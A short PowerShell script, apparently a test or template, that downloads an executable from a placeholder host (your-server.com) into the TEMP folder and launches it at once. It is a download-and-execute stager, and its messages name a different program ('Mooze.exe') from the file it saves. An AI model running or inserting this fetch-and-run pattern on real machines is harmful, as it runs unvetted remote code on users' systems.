# 1. Define the source and the local destination
$url = "https://your-server.com/test.exe"
$destination = "$env:TEMP\downloader_test.exe"

Write-Host "--- External finder ----" -ForegroundColor Yellow

try {
    Write-Host "Downloading: $url"
    Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop

    if (Test-Path $destination) {
        Write-Host "Success: File saved to $destination" -ForegroundColor Green
        
        Write-Host "Executing Mooze.exe..." -ForegroundColor Cyan
        Start-Process -FilePath $destination -Wait
        
        Write-Host "Execution complete." -ForegroundColor Green
    } else {
        Write-Host "Error: File was not found after download attempt." -ForegroundColor Red
    }
}
catch {
    Write-Host "An error occurred: $($_.Exception.Message)" -ForegroundColor Red
}
